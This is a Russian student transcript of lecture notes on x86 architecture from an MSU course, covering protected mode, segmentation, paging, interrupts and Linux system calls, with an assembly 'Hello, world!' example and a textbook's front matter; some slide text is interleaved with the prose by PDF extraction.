   Есть несколько режимов работы. Главные отличия – между реальным и защищенным
режимами.

   • Реальный режим. Модель памяти с реальной адресацией линейный адрес =
     сегментный регистр « 4 + смещение; Адрес физической памяти = линейный адрес

   • Режимы защищенной памяти. Появляется дополнительный уровень косвенности.
     Тот же сегментный регистр, который используется при вычислении линейного
     адреса трактуется другим образом: это некоторый номер описателя сегмента
     внутри таблицы, размещенной в памяти. Их этого описателя можно извлечь
     базовый адрес, который потом будем складывать со смещением.


                                                     276
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                 СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     В рамках такой дополнительной защиты на уровне прав доступа можно
     регламинтировать, с каким куском адресного пространства что мы может делать
     (читать/писать), для какого кода он доступен.
     Помимо сегментного механизма еще дополнительно включается страничная
     трансляция адресов.
                 – Базовая плоская модель. Защищенная плоская модель
                 – Мультисегментная модель

   • Независимо от используемой модели памяти может быть включена страничная
     трансляция адресов

   Плоская модель. Все те же 6 сегментных регистров отсылают к описателю, который
лежит где-то в памяти. Для него есть флаги доступа, есть базовый© 2021 МГУ/ВМК/СП
                                                                   адрес.      Считаем,
что у всех этих сигменов нулевой базовый адрес, длина 4Гб. Каждый такой сегмент
будет целиком накрывать всю Плоская     модель
                             потенциально адресуемую память, внутри которой будет
размещен код, статические данные и т.д.




                                    Рис. 24.2: Плоская модель
                                                                                     11

   В тот момент, когда идет выборка команды, используется сегментный регистр CS,
который неявно добавляется к исполнительному адресу, с которого происходит выборка.
Когда идет обращение к данным, неявно добавляется регистр DS, а когда идет работа со
стеком, используется регистр SS.
   В такой плоской модели каждая программа видит адресуемую память как
пространство от 0 до FFFF, внутри которого размещено все, что ей нужно.

   Мультисегментная модель. Каждый сегментный регистр отсылает к уже к разным
описателям, внутри этих описателей используются базовые адреса, который могут
ссылаться на разные точки внутри памяти. Будут появляться куски, для которых



                                              277
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




определены права доступа, определенные размеры. Попытка выйти, прибавляя
                                                              © 2021 МГУ/ВМК/СП
смещение, за пределы этого лимита, приведет к сбою, который ОС будет фиксировать
как прерывание.        Мультисегментная модель




                                                                                    12
                                  Рис. 24.3: Мультисегментная модель

   Описателей в таблице может быть достаточно большое количество. Сегментные
регистры внутри себя могут содержать разные индексы, переставляясь с одного
описателя на другой.

    В реальности происходит некоторое совмещение. Плоская модель связана с 4
сегментными регистрами, которые работают с кодом, с данными, со стеком. Все они
ссылаются фактически на почти одинаковые описатели, у которых база – 0, а лимит – 4
Гб. Огранияения на уровне сегментной трансляции адресов не используются.
    Есть еще два сегментных регистра:
   • FS (используется в Windows системах);

   • GS (используется в Linux системах),
которые отсылают к описателю базовый адрес которого фактически является начальным
адресом некоторой структуры в памяти, которая описывает текущее состояние потоков
выполнения.
   На служебные данные ссылаемся явно, а для всего остального используется простая
плоская модель.


Аппарат защиты памяти.
   • Переключившись в защищенный режим, мы меняем настройки процессора так, что
     машинное слово и адрес становятся 32-х разрядными; становятся доступны два


                                                 278
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                                                                              © 2021 МГУ/ВМК/СП



Архитектура ЭВМ и язык ассемблера                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ

Падарян Вартан Андроникович       А что в реальной жизни?       ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
                                                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                                                                     13

                                    Рис. 24.4: Реальная модель

     дополнительных сгментных регистра gs и fs. Архитектура набора команд будет
     позволять выполнять команды, которые с ними работают.

   • Доступны для перехода в этот режим четыре регистра управления CRn. Запись
     каких-то предопределенных значений будет приводить к тому, что будет меняться
     настройка работы.
     Напрмер, CR3 используется для управления доступом к памяти.

   • Появляется аппаратная защита памяти.

            – Для работы которой потребуются базовые адреса, по которым будут
              расположены таблицы с регистрами. Это таблицы GDTR, LDTR, IDTR
            – Становится доступка мультисегментная модель (фактически не используется)
            – Появляется многоуровневая трансляция адресов памяти.

   • На уровне аппаратуры есть поддержка аппаратного переключения задач. Т.е.
     сама аппаратура позволяет разграничивать контекст выполнения той или иной
     программы, и потом эти контексты выполнения менять (не используется).

    Сегментные селектор и дескриптор. Рассмотрим сегментный регистр в
защищенном режиме.
    Регистр называем селектором. В данном случае 16 разрядов, относящиеся к регистрам
cs, ds, ss, позволяют выбирать по заданному индексу из одной из таблиц дескриптор.
    Дескриптор состоит из двух 32-х разрядных слов. Их может быть 21 3.
   • Отдельным разрядом указывается тип таблицы: глобальная (общая таблица с
     описателями сегментов для всех программ, которые работают на компьютере) или
     локальная(сегменты, относящиеся только к одной текущей программе) таблица.


                                               279
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                                                                                     © 2021 МГУ/ВМК/СП




Архитектура ЭВМ и язык ассемблера  Сегментные селектор и дескриптор
                                                                  КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                      ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                       СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                           Рис. 24.5: Cелектор


       В некотором виде такое разделение оказывается избыточным.                      © 2021 МГУ/ВМК/СП



                   Сегментные
   • Еще два разряда               селектор
                       описывают уровень       и дескриптор
                                           привелегий, который соотнесен с этим
     сегментом памяти. Этих уровней может быть 4.

   •                                                                                        15


   Сегментный дескриптор содержит в себе 32 разряда, описывающие базу.
   Длина кодируется в 20 разрядов. Отдельный бит указывает на гранулярность этой
длины. Она может быть байтовая, либо прорциями по 4 Кбайта (4К=21 2), таким образом
захватывается все потенциально адресуемое пространство памяти. Главное, что здесь




                                          Рис. 24.6: Дескриптор                              15



присутствует – база, длина и некоторый права доступа.
    Сегментная адресация в защищенном режиме. В зависимости от выборки
(кода/данных) берется сегментный селектор, из которого берется соответствующий
индекс, берется регистр GDTR, в котором содержится базовый адрес этой таблицы
описателей. По этому базовому адресу вытаскиваем базовый адрес сегмента, который
затем складывается со смещением [eax+4*ecx]
    После сложения идет обращение в память за данными. На выходе получаем линейный
адрес.


Страничная виртуальная память.
   Рассмотрим еще один уровень преобразования адреса – уровень страничной
организации.
   Основные проблемы:

   • Нехватка физической памяти



                                                  280
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                                                                                    © 2021 МГУ/ВМК/СП


Архитектура ЭВМ и язык ассемблера                                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                              ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
                          Адресация в защищенном режиме
Падарян Вартан Андроникович                                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                 CS, DS, SS, ES, GS, FS     mov edx, dword [ds:eax
                                                                           [eax + 4+*4ecx]
                                                                                       * ecx]




                                                                                           16
                                      Рис. 24.7: Адресация в защищенном режиме


   • Необходимость изоляции одновременно работающих программ.

Вся память бьется на куски равных размеров. Старшие разряды адреса будут
преобразовываться так, что номер виртуальной страницы будет меняться на номер
физической страницы. За счет этого можно будет формировать видимое адресное
пространство нужного размера из этих кусков. Можно некоторые куски памяти
одновременно использовать в разных адресных пространствах различных работающих
программ и защищать это все друг от друга, закрывая доступ к физической памяти
нужной одной программы от других программ.
   Преобразованием адресов занимается отдельная компонента процессора MMU,
которая и должна часть адреса определенным образом пересчитывать.
   Пример. Пусть есть физическая память из 8 страниц, каждая из которых занимает 4
байта. Эти страницы чем-то заполнены. Два программы работают. Каждая из программ
хочет по 6 страниц. Можно сформировать виртуальную память на стороне каждой
работающей программы, описав устройство виртуальной памяти в таблице страниц,
привязанной к конкретной программе.

   • В программе А определено следующее отобращение:

           – 0 страницу виртуальной памяти отображаем на 0 страницу физической памяти.
           – Первая страница виртуальной памяти связана со второй страницей физической
             памяти.
           – Вторую страницу ассоциирует с первой страницей физической памяти.
           – Следующие несколько страниц недоступны, а пятая страница виртуальной
             памяти связана с седьмой страницей физической памяти.

   • В программе Б присутствует своя таблица страниц, в которой только одна страница
     недоступна.




                                                          281
     ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
     МАТЕМАТИКИ И КИБЕРНЕТИКИ
     МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




            – Нулевой адрес связан с тем, что программа А не видит(3 страница фихической
              памяти).
            – ...
            – седьмая страница физической памяти одновременно отображена в адресное
              пространство и программы А, и программы Б. Через этот общий кусок                 © 2021 МГУ/ВМК/СП


              физической памяти программы могут обзаться, если будут придерживаться
                             Страничная организация памяти
              определенного протокола.




                                            Рис. 24.8: Страничная организация памяти                   18
                                  Пример заимствован https://wiki.osdev.org/Paging


Любое обращение в память будет выражаться в том, что мы должны поменять номер
виртуальной страницы на номер физической страницы. Затем внутри страницы
определяется нужное смещение. Запись в таблице страниц (на примере 4 КБ
страниц. Адрес состоит из 32-х разрядов. Так как размеры порции занимают 4КБ, то
для адреса физической страниц достаточно 20 разрядов. Первые 12 разрядов говорят
о том, присутствует ли эта реально или нет, можно ли ее читать/писать. Следующий
бит указывает на то, может ли пользовательский код читать/писать в эту страницу. Еще
бит указывает, будет ли кэшироваться содержимое страницы. Дальше бит показывает,
обращались ли к этой странице по чтению/записи. Последний бит содержит информацию
о том, что в страницу заитсывали данные.
    Разберем, что будет происходить при попытках в команде mov edx что-то считать
по адресу eax+4*ecx.

  1. Вырабатывается логический адрес, который состоит из сегментного селектора
     и посчитанного смещения. Это определение всей нужной информации для
     последующей работы.

  2. По сегментному селектору, исходя из значения базового адреса глобальной
     таблицы десткрипторов , берется описание сегментного дескриптора. В нем
     узнается линейный адрес, к которому затем добавляется смещение. → Получили
     линейный адрес в линейном адресном пространстве программы.
     На этом завершилась работа сегментной организации.


                                                                              282
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




  3. Системный регистр CR3 указывает на базовый адрес каталога страниц.

  4. Линейный адрес бьется на 3 куска.

        (a) младшие 12 разрядов – смещение внутри страницы
        (b) старшие 20 разрядов тоже разбиваются на 2 части:
            - старшие 10 разрядов указывают на запись внутри каталога страниц. Эта
             запись содержит некоторый базовый адрес, начиная с которого идет таблица
             страниц.
            - младшие 10 из этих 20 разрядов определяют индекс внутри таблицы страниц.
             Из нее вытаскиваем запись, из которой определили базовый адрес физической
             страницы, к которой будем обращаться.
                                                                          © 2021 МГУ/ВМК/СП




                                                                                 20
                                    Рис. 24.9: Память


   • Сегментный селектор. Его значение меняется крайне редко, меняет только
     операционная система. Когда она записывает в него индекс, в этот момент внутри
     процессора кэшируется содержимое соответствующего сегментного дескриптора,
     который туда перегоняется. Таким образом прямо внутри процессора можно
     посчитать линейный адрес.

   • На уровне страничной организации проходит похожий процесс. Результаты
     транслирования номеров виртуальных страниц в номера физических страниц
     сохраняется в служебном кэше, который называется TLB. Если программа имеет в
     себе локальность, раз за разом она будет обращаться примерно к одним диапазонам.
     Раз за разом будут транслироваться одни и те же адреса. Таким образом вся схема
     не будет обращаться в память за содержимым всех таблиц и каталогов.


                                          283
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
     Упрощенная схема извлечения данных из
                   виртуальной памяти
        Архитектура ЭВМ и язык ассемблера
        Падарян Вартан Андроникович
                                                                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
                                                                      СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU


  Логический адрес
• Вычисляем смещение / адресный
  код в машинной команде
• Вычисляем линейный адрес /
  сегменты
  Линейный адрес
• Пересчитываем линейный адрес
  в физический
   – Если есть запись в TLB берем
     готовый адрес
   – Если в TLB ничего нет, вычисляем
     физический адрес, проходя по
     таблицам трансляции и
     запоминаем его в TLB
  Физический адрес
                    Рис. за
• Обращаемся в память     24.10: Упрощенная схема извлечения данных из виртуальной памяти
  данными                                               Процент промахов
   – Берем из кэша, если данные в нем                    в TLB: 0.1 – 1.0%
                • TLB – буфер ассоциативной трансляции. TLB играет ключевую роль, потому что
      присутствуют
                                                                        22
                     от него зависит, насколько успешно будут происходить трансляции.

                           – TLB кэширует записи таблицы страниц, т.е. является служебным
                             (специализированным) кэшем – В отличие от кэша данных хранятся не
                             блоки, а номера страниц. Обращение к ним идет по той же схеме, как и в
                             случае кэша данных.


            Упрощенная схема извлечения данных из виртуальной памяти


                1. Логический адрес пересчитали            в   линейный,
                   используя сегменты.

                2. Нужно пересчитать линейный адрес в физический.

                          (a) Если для соответствующего номера в TLB
                              его готовый адрес, берем его, переставляем
                              старшие разряды адреса и получаем то, что
                              нужно
                          (b) Иначе обращаемся к таблицам трансляции,
                              оттуда по нужному индексу берется нужный
                              адрес физической страницы, который затем
                              запоминается в TLB.

                3. Обращение     в   физическую          память    будет
                   предворяться проверкой кэша.


                Примечание. Процент промахов в TLB: 0.1 – 1.0 %


                                                         284
                     ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
                     МАТЕМАТИКИ И КИБЕРНЕТИКИ
                     МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Уровни (кольца) защиты
   В описателях есть определенные биты, которые разделяют привелегии между
операционной системой и прикладными программами.

   На уровне сегментов размер этого поля состоял из двух разрядов. Таким образом
получается 4 уровня, которые называются кольцами защиты.

   • В 0 зоне работает операционная система.

   • В 1 кольце с уже меньшим уровнем привелегий работают программы, у который
     привилегия равна 1.

   • Уровни защиты 1 и 2, как правило, не используются

   • Уровень 3 – зона работы пользовательской программы.

   Смена уровня привилегий – затратное по времени действие, потому что нужно
поменять много всего в служебных регистрах процессора. Это происходит только
при наступлении определенных событий. Переход с одного кольца на другой – долгое
событие (порядка 100 тактов).

   Переход между уровнями контролируется полями PL в дескрипторах сегментов.
Возможность выполнения определяется текущим уровнем привелении. Его можно
примерно соотнести с полем PL в дескрипторе.

   Итог: есть уровень привелегий, который поддерживается аппаратно. У операционной
системы и у пользовательских программ эти уровни разные. Обращаться к тому коду
и данным, которые соотнесены с уровнем ноль, прикладная программа обращаться не
может. Если она обратится, произойдет прерывание.


Прерывания.
   Прерывание – это некоторое событие, на которое аппаратура должна отреагировать
определенным образом.
   Два типа прерываний – один механизм обработки

   • Асинхронные прерывания – события, происходящие в периферийных устройствах
     (Ввод/Вывод). Не связаны с тем, что происходит на центральном процессоре

   • Синхронные прерывания (исключения) – возникновение определенных ситуаций
     при выполнении команд процессором



                                       285
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                 СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




            – Ловушки возникают при целенаправленном выполнении команды, зная, что
              она будет перехвачена и управление передастся в операционную систему.
            – Сбои возникают в случае ождания верного исполнения команды, которая по
              как-то причине отработать не может.
                                                                                              © 2021 МГУ/ВМК/СП
            – Аварийная остановка возникает в случае неустранимой ошибки. Например,
              перегрев или нарушение физической целостности компьютера.
                                  Примеры некоторых прерываний

                        Вектор (№)    Мнемоника    Описание              Источник
                        0             #DE          Ошибка при делении    Команды DIV и IDIV
                        3             #BP          Точка останова        Команда INT 3
                        13            #GP          Сбой защиты           Любые ситуации,
                                                                         связанные с нарушением
                                                                         защиты памяти
                        14            #PF          Отсутствие страницы   Обращение к
                                                                         отсутствующей странице
                        16            #MF          Сбой в x87 FPU        Команды x87
                        18            #MC          Непоправимый сбой в   Механизм самопроверки
                                                   работе аппаратуры     аппаратуры
                        32-255        ‒            Определяется          Внешние прерывания или
                                                   пользователем         команда INT n

                                     Какие классы у перечисленных прерываний?
                                            Рис. 24.11: Примеры прерываний                           26



   Реакция на прерывание. Если произошло прерывание, управоение потом может
быть передано обратно на то место, где прерывание было зафиксировано(доставка
прерывания), либо не возвращено.

   В любом случае нужно отдать управление в операционную систему. При этом можно
повысить уровень привилегии. Т.е. вызов обработчика будет сопровождаться тем, что
поменяется сегмент, связанный с кодом. В этот момент сегмент может получить права
операционной системы.
   Для того, чтобы понять, какой сегмент взять, ориентируется на номер/вектор
прерывания и таблицу описателей прерываний, где определенные адреса обработчиков
размещены.

   Некоторые прерывания можно маскировать. Т.е. работу с ненормализованным числом
можно видеть, а можно и не видеть.
   За обработку и доставку прерываний отвечают определенные компоненты, которые
называются программируемыми контроллерами прерываний (PIC). Они разделены на две
части:

   • локальный контроллер прерываний (Local APIC);


                                                           286
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • контроллер прерываний ввода/вывода ( I/O APIC).

А также контроллер прерываний содержит таймер: через заданное пользователем число
тактов будет выбрасываться прерывание от таймера. Он останавливает работу и может
выполнявшуюся ранее пользовательскую программу сдвинуть с вычислительного ядра и
поместить туда на выполнение другую программу.

   Local APIC и I/O APIC в многоядерном компьютере. Разберем схему с двумя
контроллерами. Есть некоторое количество процессоров (ядер). Каждое ядро содержит
свой локальный программируемый контроллер прерывания. Локальный контроллер
завязан на системную(фронтальную) шину. Это фронтальная шина ©занимается
                                                                     2021 МГУ/ВМК/СП
                                                                                     в
                       Local APIC и I/O APIC в многоядерном
первую очередь занимается рассылкой уведомлений через локальные контроллеры
проъерываний о том, что кэшы в отдельных ядрах между собой рассинхронизировались.
                                     компьютере
Внешние события поступают на контроллер ввода/вывода. Все происходит на едином

                  Процессор               Процессор             Процессор            Процессор
                              ЦПУ                 ЦПУ                  ЦПУ                 ЦПУ



     Прерывания                      Прерывания           Прерывания         Прерывания

                                    Прерывания          Системная (локальная) шина процессора
                                                                        IPI (inter-processor interrupt) –
                                                                        межпроцессорные прерывания,
                                             Мост
                                                                        используемые для
                                                                        синхронизации работы ядер.
                                                                        В основном используются для
                                                                        управления кэшем.
                                                                       Внешние
                                                                       прерывания

                                            Набор микросхем
                                                                                                           28
                       Рис. 24.12: Local APIC и I/O APIC в многоядерном компьютере

механизме доставки сообщений через шину PCI.
   Если пришло прерывание в устройство на его APIC, он формирует служебный пакет
данных, который через шину PCI, через мост доставляет информацию в локальный
контроллер, через который процессор узнает о событии.
   Когда проуессор узнал о том, что что-то произошло, он смотрит на служебный
регистр IDTR(см. рис 24.12), по номеру прерывания находит нужный описатель
прерывания. Дальше получает некоторое смещение внутри локальной таблицы, берет
оттуда сегментный дескриптор, складывает базовый адрес с самим смещением и передает
управление на обработчик прерывания, который где-то живет в памяти.



                                                              287
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                                                                                          © 2021 МГУ/ВМК/СП




Архитектура ЭВМ и язык ассемблера
                                  Передача управления в обработчик
                                                                КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                    ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович       прерывания в защищенном режимеСЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                        IDT




                                                                      • Каждое кольцо защиты
                                                                        обладает своим стеком
                                                                      • Возврат из обработчика
                                                                        прерывания – отдельное
                                                                        семейство команд iret
                                                      В некоторых случаях (например, #PF)
                                                      на стек дополнительно помещается           29
                                                      код ошибки

   Рис. 24.13: Передача управления в обработчик прерывания в защищенном режиме

   В этот момент на СТЭК могут быть помещены некоторые важные регистры, которые
описывают, что происходило в этот момент в пользовательской программе и т.д.
   В каждом кольце защиты существует свой стэк.
   Если при прерывании мы перепрыгиваем рз пользовательского кода в систему.
   Если прерывание произодшо при рвботе операционной системы, изменений уровня
привелегий не происходит.
   Механизм прерываний – то, с помощью чего можно попросить операциооную систему
сделать для нас что-то полезное. Например, аппаратура, память операционной системы и
других программ не доступны. Управляющие регистры лежат в тех диапазоных, которые
не видны пользовательскому коду и т.д. Получается, что единственное, что видит
программа – это регистр процессора и некоторый диапазон адресов физической памяти,
которые доступны ей после настройки трансляции. Чтобы попросить операционную
систему что-то для нас сделать, нужно выполнять определенные команды.
   Системные вызовы Системный вызов – основной способ «обратиться» к
операционной системе

   • syscall/sysret

   • sysenter/sysexit

   • int/iret

   В ОС Linux системный вызов реализован как прерывание

   • int 0x80


                                                288
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU


                                                                                                       © 2021 МГУ/ВМК/СП
   • Передача параметров – через регистры: номер функции – eax параметры – ebx, ecx,
     edx, esi, edi          Примеры некоторых
                                         системных вызовов ОС Linux
                        EAX       Название     EBX                     ECX                    EDX
                        1         sys_exit     int                              ‒                    ‒
                        3         sys_read     unsigned int            char *                 size_t
                        4         sys_write    unsigned int            const char *           size_t
                        5         sys_open     const char *            int                    int
                        6         sys_close    unsigned int                     ‒                    ‒
                        116       sys_sysinfo struct sysinfo *                  ‒                    ‒

                        Источник: http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html (Eng)
                        Рис. 24.14: Примеры некоторых системных вызовов ОС Linux

                   Дальнейшие и дополнительные материалы
                   •        Основной курс 3 семестра «Операционные системы»
Hello, world!
         • Коллекция статей об устройстве ОС
                            http://wiki.osdev.org/Expanded_Main_Page (Eng)                                    31
   Рассмотрим прим пример, в котором нужный функционал, а именно вывод строки,
будет делать операционная система.
   Данный кон неперонисим между другими UNIX системами, потому что там будут свои
правила системных вызовов.

   • Определяем строчку ”Hello, world!”в секции data, определяем ее размер

   • После метки start, которая соотносится с точкой входа в программу, на которую
     передаст управление загрузчик, как только программа будет готова к запуску,
     укажем, что нужна функция 4.

   • Функция 4 – функция записи в файл. Укажем номер файла.

   • 1 – стандартный вывод

   • В ecx и edx отправляем адрес начала строки и ее длину.

   • Вызываем int 80h, что приводит к тому, что операционная система с заданного
     адреса на консоль напечатает заданную строку.

   • Это завершается вызовом системного вызова номер 1, указав нулевой код возврата.

   • Финишируем прогамму с нулевым кодом.




                                                               289
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                                                                       © 2021 МГУ/ВМК/СП

    snoop@earth:~/samples$ nasm -f elf32 -o syscall.o syscall.asm
    snoop@earth:~/samples$ nm syscall.o
       «Hello, world!» без привлечения языка Си
    00000000 T _start
    00000000 d msg
    0000000e a msg_len
    snoop@earth:~/samples$ ld -o syscall syscall.o
    snoop@earth:~/samples$ nm syscall
    080490b2 A __bss_start
                                            section .data
    080490b2 A _edata
                                              msg db `Hello, world!\n`
    080490b4 A _end
                                              msg_len equ $-msg
    08048080 T _start
    080490a4 d msg
                                            section .text
    0000000e a msg_len
                                            global _start
    snoop@earth:~/samples$ ./syscall
                                            _start:
    Hello, world!
                                               mov eax, 4
    snoop@earth:~/samples$
                                               mov ebx, 1
     #include <unistd.h>                       mov ecx, msg
     #include <stdlib.h>                       mov edx, msg_len
                                                        int 80h
     void main() {
        write(1, "Hello, world!\n", 14);                mov eax, 1
        exit(0);                                        mov ebx, 0                            32
     }                                                  int 80h

                                  Рис. 24.15: Hello, world!




                                            290
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
ФАКУЛЬТЕТ
ВЫЧИСЛИТЕЛЬНОЙ
МАТЕМАТИКИ И
КИБЕРНЕТИКИ
МГУ ИМЕНИ
М.В. ЛОМОНОСОВА
     МОСКОВСКИЙ ГОСУДАРСТВЕННЫЙ УНИВЕРСИТЕТ

               имени М.В. Ломоносова

  Факультет вычислительной математики и кибернетики




 Е.А. Кузьменкова, В.С. Махнычев, В.А. Падарян



    Семинары по курсу
"Архитектура ЭВМ и язык ас-
        семблера"
       (учебно-методическое пособие)
                      Часть 1




                     МАКС ПРЕСС

                    Москва – 2023
УДК 004.2+004.43(075.8)
ББК 32.973-02я73
    К89

          Печатается по решению Редакционно-издательского Совета
           факультета вычислительной математики и кибернетики
                         МГУ имени М.В. Ломоносова

                                    Рецензенты:
                             C.Ю. Соловьев, профессор
                               А.Н. Терехин, доцент

Е.А. Кузьменкова, В.С. Махнычев, В.А. Падарян.

К89 Семинары по курсу «Архитектура ЭВМ и язык ассемблера»: учебно-
    методическое пособие. Часть 1. — Издание 2-е, дополненное. М. Изда-
    тельский отдел факультета ВМиК МГУ им. М.В. Ломоносова (лицензия
    ИД № 05899 от 24.09.2001); МАКС Пресс, 2014. – 80 с.

ISBN 978-5-89407-529-7

ISBN 978-5-317-04885-3

Учебное пособие содержит задачи и упражнения по первой части семинарских
занятий курса «Архитектура ЭВМ и язык ассемблера», прочитанного студентам 1
потока 1 курса факультета Вычислительной математики и кибернетики МГУ в
2010-2023 гг. Пособие предназначено для студентов, изучающих основной курс
программирования, а также для преподавателей и аспирантов.
